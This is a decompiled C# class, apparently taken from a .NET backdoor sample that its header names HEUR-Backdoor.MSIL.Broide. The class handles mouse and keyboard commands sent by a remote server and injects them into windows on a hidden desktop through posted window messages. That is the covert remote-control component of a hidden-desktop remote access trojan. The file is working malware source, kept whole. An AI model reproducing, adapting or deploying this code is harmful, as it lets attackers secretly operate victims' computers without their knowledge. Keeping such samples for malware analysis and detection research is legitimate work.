// Decompiled with JetBrains decompiler
// Type: RemoteClient.InputEmulation
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using RemoteClient.Packets.Server;
using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace RemoteClient
{
  internal class InputEmulation
  {
    private static bool IsDown = false;
    private static IntPtr toMove = IntPtr.Zero;
    private static Native.Class16 rcM = new Native.Class16();
    private static Point pM;
    private static IntPtr lastInputWnd;

    public static void HandleDoMouseEvent(ServerPackets.DoMouseEvent Param_88)
    {
      try
      {
        if ((!(Streaming.ActiveDesktop != IntPtr.Zero) ? 0 : (Streaming.ActiveDesktop == Streaming.Hdsktp ? 1 : 0)) != 0)
        {
          InputEmulation.DirectInput(Param_88, 0, 0);
        }
        else
        {
          int x = Screen.PrimaryScreen.Bounds.X;
          int y = Screen.PrimaryScreen.Bounds.Y;
          Point point = new Point(Param_88.int_141 + x, Param_88.int_142 + y);
          if ((Param_88.Class13_320 > InputEmulation.MouseAction.Class13_12 ? 0 : (Native.smethod_49() ? 1 : 0)) != 0)
            Native.smethod_50();
          switch (Param_88.Class13_320)
          {
            case InputEmulation.MouseAction.Class13_8:
            case InputEmulation.MouseAction.Class13_9:
              Native.smethod_43(point, Param_88.Boolean_321);
              break;
            case InputEmulation.MouseAction.Class13_10:
            case InputEmulation.MouseAction.Class13_11:
              Native.smethod_44(point, Param_88.Boolean_321);
              break;
            case InputEmulation.MouseAction.Class13_12:
              Native.smethod_45(point);
              break;
            case InputEmulation.MouseAction.Class13_13:
              Native.smethod_46(point, false);
              break;
            case InputEmulation.MouseAction.Class13_14:
              Native.smethod_46(point, true);
              break;
          }
        }
      }
      catch
      {
      }
    }

    private static void DirectInput(
      ServerPackets.DoMouseEvent Param_89,
      int Param_90,
      int Param_91)
    {
      Native.SetThreatDesktop(Streaming.Hdsktp);
      StringBuilder stringBuilder = new StringBuilder(1024);
      Point point1 = new Point(Param_89.int_141 + Param_90, Param_89.int_142 + Param_91);
      IntPtr num1 = Native.smethod_84(point1);
      InputEmulation.lastInputWnd = num1;
      Native.GetClassName(num1, stringBuilder, 1024);
      Native.Class16 class16_1 = new Native.Class16();
      Native.GetWindowRect(num1, out class16_1);
      IntPtr num2 = num1;
      if (stringBuilder.ToString() != "#32768")
      {
        while (Native.smethod_71(num2) != IntPtr.Zero)
          num2 = Native.smethod_71(num2);
        Native.smethod_85(num2);
        point1.X -= class16_1.property_1;
        point1.Y -= class16_1.property_2;
      }
      switch (Param_89.Class13_320)
      {
        case InputEmulation.MouseAction.Class13_8:
          InputEmulation.IsDown = true;
          if (point1.Y < 20)
          {
            InputEmulation.pM = new Point(Param_89.int_141 + Param_90, Param_89.int_142 + Param_91);
            InputEmulation.toMove = Native.smethod_84(InputEmulation.pM);
            Native.GetWindowRect(InputEmulation.toMove, out InputEmulation.rcM);
            InputEmulation.pM.X -= InputEmulation.rcM.property_1;
            InputEmulation.pM.Y -= InputEmulation.rcM.property_2;
          }
          Native.PostMessage(num1, 513, 1, Native.smethod_98(point1.X, point1.Y));
          Point point2 = new Point(Param_89.int_141 + Param_90, Param_89.int_142 + Param_91);
          Native.Class16 class16_2 = new Native.Class16();
          Native.GetWindowRect(num2, out class16_2);
          point2.X -= class16_2.property_1;
          point2.Y -= class16_2.property_2;
          Native.SetWindowPos(num2, Native.Class26.int_126, Param_89.int_141 - point2.X, Param_89.int_142 - point2.Y, 0, 0, 1U);
          break;
        case InputEmulation.MouseAction.Class13_9:
          InputEmulation.IsDown = false;
          InputEmulation.toMove = IntPtr.Zero;
          switch (Native.smethod_54(num2, Native.Class20.Class20_101, IntPtr.Zero, (IntPtr) Native.smethod_98(point1.X + class16_1.property_1, point1.Y + class16_1.property_2)))
          {
            case 3:
              Native.PostMessage(num2, 16, 0, 0);
              break;
            case 9:
              Native.PostMessage(num2, 274, 61488, 0);
              break;
            case 20:
              Native.PostMessage(num2, 16, 0, 0);
              break;
          }
          Native.PostMessage(num1, 514, 1, Native.smethod_98(point1.X, point1.Y));
          break;
        case InputEmulation.MouseAction.Class13_10:
          Native.PostMessage(num1, 516, 2, Native.smethod_98(point1.X, point1.Y));
          break;
        case InputEmulation.MouseAction.Class13_11:
          Native.PostMessage(num1, 517, 2, Native.smethod_98(point1.X, point1.Y));
          break;
        case InputEmulation.MouseAction.Class13_12:
          if (InputEmulation.IsDown)
            Native.SetWindowPos(InputEmulation.toMove, Native.Class26.int_126, Param_89.int_141 - InputEmulation.pM.X, Param_89.int_142 - InputEmulation.pM.Y, 0, 0, 1U);
          Native.PostMessage(num1, 512, 0, Native.smethod_98(point1.X, point1.Y));
          break;
        case InputEmulation.MouseAction.Class13_13:
          Native.PostMessage(num1, 277, 0, 0);
          break;
        case InputEmulation.MouseAction.Class13_14:
          int num3 = Native.smethod_75(num1, 1) + 20;
          Native.smethod_76(num1, 1, num3, IntPtr.Zero);
          break;
      }
    }

    public static void HandleDoKeyboardEvent(ServerPackets.DoKeyboardEvent Param_92)
    {
      if (Streaming.ActiveDesktop == Streaming.defaultDesktop)
        Native.smethod_47(Param_92.byte_6, Param_92.Boolean_322);
      else if (Param_92.byte_6 >= (byte) 0 && Param_92.byte_6 <= (byte) 6 || Param_92.byte_6 == (byte) 13)
      {
        switch (Param_92.byte_6)
        {
          case 0:
            Native.PostMessage(InputEmulation.lastInputWnd, 256, 8, 0);
            Native.PostMessage(InputEmulation.lastInputWnd, 257, 8, 0);
            break;
          case 1:
            Native.PostMessage(InputEmulation.lastInputWnd, 256, 37, 0);
            Native.PostMessage(InputEmulation.lastInputWnd, 257, 37, 0);
            break;
          case 2:
            Native.PostMessage(InputEmulation.lastInputWnd, 256, 38, 0);
            Native.PostMessage(InputEmulation.lastInputWnd, 257, 38, 0);
            break;
          case 3:
            Native.PostMessage(InputEmulation.lastInputWnd, 256, 39, 0);
            Native.PostMessage(InputEmulation.lastInputWnd, 257, 39, 0);
            break;
          case 4:
            Native.PostMessage(InputEmulation.lastInputWnd, 256, 40, 0);
            Native.PostMessage(InputEmulation.lastInputWnd, 257, 40, 0);
            break;
          case 5:
            Native.PostMessage(InputEmulation.lastInputWnd, 256, 46, 0);
            Native.PostMessage(InputEmulation.lastInputWnd, 257, 46, 0);
            break;
          case 13:
            Native.PostMessage(InputEmulation.lastInputWnd, 256, 13, 0);
            Native.PostMessage(InputEmulation.lastInputWnd, 257, 13, 0);
            break;
        }
      }
      else
        Native.PostMessage(InputEmulation.lastInputWnd, 258, (int) Param_92.byte_6, 0);
    }

    public enum MouseAction
    {
      Class13_8,
      Class13_9,
      Class13_10,
      Class13_11,
      Class13_12,
      Class13_13,
      Class13_14,
      Class13_15,
    }
  }
}
